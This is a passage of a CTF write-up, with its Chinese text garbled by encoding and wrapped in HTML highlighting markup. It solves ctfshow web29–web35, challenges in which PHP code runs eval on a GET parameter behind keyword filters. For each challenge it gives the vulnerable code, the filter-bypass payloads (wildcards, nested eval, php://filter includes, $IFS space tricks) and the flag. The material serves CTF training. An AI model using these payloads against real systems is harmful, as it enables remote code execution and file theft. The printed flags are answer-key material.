data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    </pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>é¦–å…ˆå…ˆä»£ç å®¡è®¡</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>iæ˜¯ä¸åŒºåˆ†å¤§å°å†™ï¼Œpreg_matchå‡½æ•°è¿‡æ»¤æ‰flag</pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç”¨é€šé…ç¬¦è¾“å‡º flag</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payloadï¼š</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;9d6e8252-afda-45d3-a707-c71cc83c5f38&#125;
</code></pre><h2 id="web30"><a class="anchor" href="#web30">#</a> web30</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-04 00:42:26</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    </pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>è¿™æ¬¡æ˜¯ flagã€systemã€php è¢«è¿‡æ»¤æ‰äº†</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>å‘½ä»¤æ‰§è¡Œå‡½æ•°</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token function">popen</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>åå¼•å· åŒ<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payloadï¼š</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;285ab479-be6c-4880-9ec9-254b3c17ca90&#125;
</code></pre><h2 id="web31"><a class="anchor" href="#web31">#</a> web31</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-04 00:49:10</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    </pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>è¿™æ¬¡è¿‡æ»¤æ‰äº† cat|sort|shellã€ç‚¹å’Œå•å¼•å·</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payload1ï¼š</pre></td></tr><tr><td data-num="2"></td><td><pre>c<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// åµŒå¥— eval ç»•è¿‡ preg_match å‡½æ•°</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>payload2ï¼š</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>url<span class="token punctuation">]</span></span>"</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&amp;</span>url<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">// åˆ©ç”¨ include ç»“åˆä¼ªåè®®åŒ…å«è¯»å–</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    </pre></td></tr><tr><td data-num="9"></td><td><pre>payload3ï¼š</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac<span class="token interpolation"><span class="token variable">$09f</span></span>*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="12"></td><td><pre>passthru ç›´æ¥è¯»å–</pre></td></tr><tr><td data-num="13"></td><td><pre>$09 ä»£æ›¿ç©ºæ ¼</pre></td></tr><tr><td data-num="14"></td><td><pre>*/</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>payload4<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac\$IFS\$09f*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">//$IFS$09 ç»“åˆç»•è¿‡ç©ºæ ¼</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;8fae6aeb-110e-42fe-81fe-d74ee49c1e52&#125;
</code></pre><h2 id="web32"><a class="anchor" href="#web32">#</a> web32</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-04 00:56:31</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    </pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>ç‚¹ã€ç©ºæ ¼ã€å•å¼•å·ã€åå•å¼•å·ã€echoã€åˆ†å·ã€æ‹¬å·éƒ½è¿‡æ»¤æ‰äº†ï¼ˆè¿‡æ»¤ sssssï¼‰</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payload1<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>url<span class="token punctuation">]</span></span>"</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&amp;</span>url<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// åˆ©ç”¨ include ç»“åˆä¼ªåè®®åŒ…å«è¯»å–</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;d8264780-aefd-4fe8-a561-fea3b300a63b&#125;
</code></pre><h2 id="web33"><a class="anchor" href="#web33">#</a> web33</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-04 02:22:27</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    </pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>è¿‡æ»¤å‡çº§ï¼Œæ·»åŠ äº†åŒå¼•å·</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payload<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>url<span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&amp;</span>url<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// åˆ©ç”¨ include ç»“åˆä¼ªåè®®åŒ…å«è¯»å–</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;0c229e04-4fd2-45b7-9ca7-66887b0a11c7&#125;
</code></pre><h2 id="web34"><a class="anchor" href="#web34">#</a> web34</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-04 04:21:29</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    </pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>è¿‡æ»¤å‡çº§ï¼Œæ·»åŠ äº†å†’å·</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payload<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>url<span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&amp;</span>url<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// åˆ©ç”¨ include ç»“åˆä¼ªåè®®åŒ…å«è¯»å–</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;d0a0ee0e-d7a9-4e57-a1b1-a3d8a313e914&#125;
</code></pre><h2 id="web35"><a class="anchor" href="#web35">#</a> web35</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-04 00:12:34</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-04 04:21:23</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\&lt;|\=/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    </pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>è¿‡æ»¤å‡çº§ï¼Œæ·»åŠ äº† &lt; å’Œ = çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption 